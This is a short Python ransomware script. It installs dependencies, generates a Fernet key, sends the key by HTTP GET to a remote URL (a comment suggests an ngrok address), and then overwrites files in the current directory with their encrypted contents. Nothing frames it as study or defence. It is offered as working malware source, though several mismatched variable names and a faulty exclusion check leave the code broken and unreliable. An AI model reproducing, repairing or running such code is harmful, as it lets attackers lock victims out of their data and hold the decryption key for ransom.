#! /bin/env python3

import os

os.system("pip3 install requests cryptography")

import requests
from cryptography.fernet import Fernet

encrypted_files = []

#change the file names
for file in os.listdir():
    if file == "c_note.txt" and "docker_note.txt":
        continue
    encrypted_files.append(file)

#generating a key
encrypt_key = Fernet.generate_key()

#change the url(ngrok)
url = "http://192.168.0.1/"
send_key = requests.get(url,encrypt_key)

#read the file and encode it
for encode in encrypted_file:
    with open(encode, 'rb') as read_file:
        encoded = read_file.read()
    content_encode = Fernet(encrypted_key).encrypt(encoded)
    with open(file, 'wb') as encode_file:
        encode_file.write(content_encode)




